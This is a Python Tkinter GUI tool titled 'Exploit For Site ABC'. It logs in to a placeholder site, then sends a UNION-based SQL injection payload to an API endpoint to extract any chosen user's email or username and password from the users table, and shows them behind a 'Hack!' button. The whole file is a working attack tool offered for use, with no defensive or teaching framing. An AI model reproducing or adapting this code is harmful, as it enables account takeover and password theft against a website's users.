from Tkinter import *
import requests,json
mainroot = Tk()
mainroot.wm_title("Exploit For Site ABC - Ijaz Ur Rahim (The Alien)")
mainroot.minsize(500,400)
mainroot.iconbitmap("logo.ico")
root = Frame(mainroot)
root1 = Frame(mainroot)
root2 = Frame(mainroot)
root.pack()

def warning():
	warning = Label(root,text="Failed to Login",fg='red')
	warning.config(font=("Courier", 10),pady=2)
	warning.grid(padx=20)
	
def warning1():
	warning = Label(root1,text="Something Went Wrong",fg='red')
	warning.config(font=("Courier", 10),pady=2)
	warning.grid(padx=20)

def login(event=None):
	global cookie
	Credentials = {
		"login_csrf_token":"6444ed8ea16d6691f434a8bd0c731dae4d318bc0",
		"identity":entryE.get(),
		"password":entryP.get()		
	}
	try:
		r = requests.post("https://www.site.com/login",data=Credentials,allow_redirects=False,timeout=10)
                try:
                        if r.headers['refresh']:
                                warninig()
                except:
                        if int(r.status_code) == 500:
                                warning()
                        else:
                                root.pack_forget()
                                root1.pack()
                                cookie = r.headers['set-cookie'].split(";")[0]
	except:
		warning()

def search(event=None):
	headers={"cookie":cookie}
	if entrySE.get()=='':
		option1 = "email"
		option2 = "username"
		option3 = entryU.get()
		userF = 'yes'
	else:
		option1 = "username"
		option2 = "email"
		option3 = entrySE.get()
		userF = 'no'
	posts1 = {"0":{"email":"-lol@lol.com'union select 1,2,3,(select group_concat("+option1+",0x3a,password) from users where "+option2+"='"+option3+"')-- -","name":"a"}}
	posts = {"users":json.dumps(posts1)}
        try:
                r = requests.post("https://www.site.com/m/apifront/check_users",data=posts,headers=headers,allow_redirects=False)
                l = json.loads(r.text)[0]['profileimage']
                a = l.split("/")[-1]
                par1,par2 = a.split(":")
                if userF == 'yes':
                        EmailF.config(text="Username")
                root1.pack_forget()
                root2.pack()
                entryF.delete(0,END)
                entryPa.delete(0,END)
                entryF.insert(END,par1.replace("%40","@"))
                entryPa.insert(END,par2)
        except:
                warning1()
def back():
        root2.pack_forget()
        root1.pack()
        entryU.delete(0,END)
        entrySE.delete(0,END)
logo = PhotoImage(file="logo.gif")
photo = Label(root,image=logo,height=200)
photo.grid(row=0,column=1)
################# EMAIL ####################
Email = Label(root,text="Email",fg="black")
Email.config(font=("Courier", 17))
Email.grid(row=1,column=0,sticky=E,padx=20)
entryE= Entry(root,font=("Vardana",15))
entryE.config(highlightbackground="black")
entryE.grid(row=1,column=1)
entryE.focus()
###########################################

################ PASSWORD #################
Pass = Label(root,text="Password",fg="black")
Pass.config(font=("Courier", 17),pady=5)
Pass.grid(row=2,column=0,padx=20,sticky=E)
entryP= Entry(root,font=("Vardana",15),show="*")
entryP.config(highlightbackground="black")
entryP.grid(row=2,column=1)
entryP.bind("<Return>",login)
##########################################

################# BUTTON ################
Submit = Button(root,text="Submit",command=login)
Submit.config(font=("Vardana",17),highlightbackground='black',fg='black',bd=1)
Submit.grid(column=1)

photo = Label(root1,image=logo,height=200)
photo.grid(row=0,column=1)
################# Search by EMAIL ####################
SEmail = Label(root1,text="Email",fg="black")
SEmail.config(font=("Courier", 17))
SEmail.grid(row=1,column=0,sticky=E,padx=20)
entrySE= Entry(root1,font=("Vardana",15))
entrySE.config(highlightbackground="black")
entrySE.grid(row=1,column=1)
entrySE.focus()
entrySE.bind("<Return>",search)
###########################################

###########################################
Or = Label(root1,text="OR",fg="blue")
Or.config(font=("Courier",17),pady=5)
Or.grid(row=2,column=1)
###########################################

################ Search by Username #################
UserN = Label(root1,text="Username",fg="black")
UserN.config(font=("Courier", 17),pady=5)
UserN.grid(row=3,column=0,padx=20,sticky=E)
entryU= Entry(root1,font=("Vardana",15))
entryU.config(highlightbackground="black")
entryU.grid(row=3,column=1)
entryU.bind("<Return>",search)
##########################################

################# BUTTON ################
Search = Button(root1,text="Hack!",command=search)
Search.config(font=("Vardana",17),highlightbackground='black',fg='black',bd=1)
Search.grid(column=1)


photo = Label(root2,image=logo,height=200)
photo.grid(row=0,column=1)
################# USERNAME/EMAIL FOUND ####################
EmailF = Label(root2,text="Email",fg="black")
EmailF.config(font=("Courier", 17))
EmailF.grid(row=1,column=0,sticky=W,padx=20)
entryF= Entry(root2,font=("Vardana",15))
entryF.config(highlightbackground="black")
entryF.grid(row=1,column=1)
###########################################

################ PASSWORD FOUND #################
pASSWORD = Label(root2,text="Password",fg="black")
pASSWORD.config(font=("Courier", 17),pady=5)
pASSWORD.grid(row=3,column=0,padx=20,sticky=E)
entryPa= Entry(root2,font=("Vardana",15))
entryPa.config(highlightbackground="black")
entryPa.grid(row=3,column=1)
##########################################

################# BUTTON ################
Back = Button(root2,text="Back",command=back)
Back.config(font=("Vardana",17),highlightbackground='black',fg='black',bd=1)
Back.grid(column=1)




mainroot.mainloop()
